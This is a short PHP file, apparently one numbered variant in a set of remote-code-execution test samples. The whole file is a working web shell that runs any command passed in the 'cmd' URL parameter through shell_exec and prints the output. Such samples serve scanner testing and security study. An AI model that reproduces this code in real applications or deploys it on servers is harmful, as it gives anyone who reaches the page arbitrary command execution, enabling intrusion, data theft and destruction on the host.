<?php
// RCE test variation #1212
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>